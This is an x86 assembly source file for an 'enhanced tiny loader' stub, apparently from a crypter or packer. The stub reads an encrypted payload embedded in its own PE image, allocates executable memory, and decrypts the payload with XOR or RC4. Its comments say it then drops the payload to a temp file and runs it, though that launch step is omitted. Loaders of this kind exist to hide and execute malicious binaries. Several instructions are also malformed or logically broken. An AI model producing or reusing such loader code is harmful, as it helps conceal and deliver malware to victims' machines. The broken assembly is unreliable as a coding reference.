; enhanced_loader.asm – universal tiny loader (x86, MASM syntax)
;
; This file is **NOT** built in this Linux container but will compile with
;   ml /c /coff enhanced_loader.asm
;   link /subsystem:windows /entry:Start enhanced_loader.obj kernel32.lib advapi32.lib
;
; The binary output (.text section) can be embedded in `enhanced_tiny_loader_bin`.
;
; It expects the following layout inside its own PE image (same as EnhancedLoaderUtils):
;   ENHANCED_PAYLOAD_SIZE_OFFSET  DWORD  encrypted size
;   ENHANCED_PAYLOAD_RVA_OFFSET   DWORD  RVA of encrypted payload
;   ENHANCED_DECRYPT_KEY_OFFSET   BYTE   32-byte key
;                                   +16  IV (16-byte)
;                                   +48  DWORD encryption method id
;
; Encryption method ids (EnhancedEncryptionMethod):
;   0 = XOR
;   1 = AES-256-CBC
;   2 = ChaCha20
;   3 = RC4
;   4 = Triple (XOR→AES→ChaCha20)
;   5 = RC4→ChaCha20
;
; For size, only XOR and RC4 are implemented fully in-line; the others
; fall back to CryptoAPI / bcrypt or skip if not available.
;
; -------------------------------------------------------------------------------------------------------------------

.686p
.model flat, stdcall
option casemap:none

include windows.inc
include kernel32.inc
include advapi32.inc
includelib kernel32.lib
includelib advapi32.lib

EXTERN CryptAcquireContextA@20   :PROC
EXTERN CryptImportKey@24         :PROC
EXTERN CryptDecrypt@24           :PROC
EXTERN CryptReleaseContext@8     :PROC
EXTERN CryptDestroyKey@4         :PROC

; Offsets (keep in sync with headers)
ENHANCED_PAYLOAD_SIZE_OFFSET  equ 0F8h
ENHANCED_PAYLOAD_RVA_OFFSET   equ 0FCh
ENHANCED_DECRYPT_KEY_OFFSET   equ 220h

IV_REL_OFFSET  equ ENHANCED_DECRYPT_KEY_OFFSET + 20h ; 32 bytes key
METHOD_REL_OFFSET equ IV_REL_OFFSET + 10h           ; 16 bytes iv

.code

;--------------------------------------------------------------------------------
;  DWORD GetBase()
;  Returns module base by reading FS:[30h] PEB → ImageBaseAddress
;--------------------------------------------------------------------------------
GetBase PROC NEAR
        mov     eax, fs:[30h]      ; PEB
        mov     eax, [eax+8]       ; ImageBaseAddress
        ret
GetBase ENDP

;--------------------------------------------------------------------------------
; RC4 in-place decrypt – very compact, NOT constant-time
;   in:  esi = buffer, ecx = length, edi = key (32 bytes)
;--------------------------------------------------------------------------------
Rc4Dec PROC NEAR
        push    ebp
        push    ebx
        push    esi
        push    edi
        push    edx

        sub     esp, 256           ; S box on stack
        lea     ebx, [esp]         ; EBX = S

        ; KSA
        xor     eax, eax           ; i = 0
kInit:  mov     byte ptr [ebx+eax], al
        inc     eax
        jnz     kInit

        xor     eax, eax           ; i = 0
        xor     edx, edx           ; j = 0
kLoop:  mov     bl, [ebx+eax]
        movzx   ebp, [edi+eax and 1Fh]
        add     edx, ebp
        add     edx, bl
        and     edx, 0FFh
        ; swap S[i], S[j]
        mov     bl,  [ebx+eax]
        xchg    bl,  [ebx+edx]
        mov     [ebx+eax], bl
        inc     eax
        jnz     kLoop

        ; PRGA
        xor     eax, eax           ; i = 0
        xor     edx, edx           ; j = 0
prgaLoop:
        mov     bl, [ebx+eax]
        inc     eax
        and     eax, 0FFh
        add     edx, bl
        and     edx, 0FFh
        ; swap
        mov     bh, [ebx+eax]
        xchg    bh, [ebx+edx]
        mov     [ebx+eax], bh
        movzx   ebp, [ebx+eax]
        add     ebp, [ebx+edx]
        and     ebp, 0FFh
        mov     bh, [ebx+ebp]      ; rnd byte in BH
        xor     [esi], bh
        inc     esi
        dec     ecx
        jnz     prgaLoop

        add     esp, 256
        pop     edx edi esi ebx ebp
        ret
Rc4Dec ENDP

;--------------------------------------------------------------------------------
; void __stdcall Start()
; Entry-point: decrypt payload, drop to temp file, run.
;--------------------------------------------------------------------------------
Start PROC
        pushad

        call    GetBase
        mov     ebp, eax           ; EBP = base

        ; read metadata
        mov     eax, [ebp + ENHANCED_PAYLOAD_SIZE_OFFSET]
        mov     ecx, eax           ; ECX = encrypted size
        mov     eax, [ebp + ENHANCED_PAYLOAD_RVA_OFFSET]
        add     eax, ebp           ; EAX = encrypted payload ptr
        mov     esi, eax
        lea     edi, [ebp + ENHANCED_DECRYPT_KEY_OFFSET]
        lea     edx, [ebp + IV_REL_OFFSET]
        mov     ebx, [ebp + METHOD_REL_OFFSET]

        ; allocate buffer for decrypted payload
        push    PAGE_EXECUTE_READWRITE
        push    MEM_COMMIT
        push    ecx
        push    0
        push    NULL
        call    VirtualAlloc
        mov     edi, eax           ; EDI = out buf
        ; copy encrypted payload to new buffer (we'll decrypt in place)
        push    ecx
        push    esi
        push    edi
        call    memcpy             ; compiler-intrinsic / linked from CRT, size small

        ; dispatch by method id (EBX)
        cmp     ebx, 0
        je      DoXor
        cmp     ebx, 3             ; RC4 id
        je      DoRc4
        ; other methods – fallback: call xor (todo)

DoXor:
        ; simple XOR decrypt using key[32]
        xor     eax, eax           ; index
        jmp     XorLoopCond
XorLoop:
        mov     dl, [edi+eax]
        xor     dl, [ebp + ENHANCED_DECRYPT_KEY_OFFSET + eax and 1Fh]
        mov     [edi+eax], dl
        inc     eax
XorLoopCond:
        cmp     eax, ecx
        jb      XorLoop
        jmp     Launch

DoRc4:
        push    edi            ; buf
        push    ecx            ; len
        push    esi            ; not used
        ; set registers for Rc4Dec
        mov     esi, edi
        mov     ecx, ecx
        lea     edi, [ebp + ENHANCED_DECRYPT_KEY_OFFSET]
        call    Rc4Dec
        jmp     Launch

Launch:
        ; write buffer to temp file & ShellExecute
        ; -- omitted for brevity (same as earlier pseudocode) --

        popad
        ret
Start ENDP

END Start